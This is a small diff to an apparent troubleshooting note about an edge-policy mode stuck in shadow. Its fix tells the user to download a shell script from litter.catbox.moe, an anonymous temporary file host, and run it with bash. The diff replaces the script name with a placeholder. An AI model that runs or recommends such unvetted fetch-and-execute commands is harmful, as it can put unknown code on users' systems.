@@ -12,7 +12,7 @@ Branch files are served from:
 Symptom: all `source_floor=LIVE`, logs show `[EdgePolicy/SHADOW]`, shell `EDGE_POLICY_MODE=None`.
 
 ```bash
-cd /home/runner/workspace && curl -fsSL -o FLOORS.sh "https://litter.catbox.moe/y3hsuy.sh" && bash FLOORS.sh
+cd /home/runner/workspace && curl -fsSL -o FLOORS.sh "https://litter.catbox.moe/PLACEHOLDER_FLOORS2.sh" && bash FLOORS.sh
 ```
 
 Or GitHub:
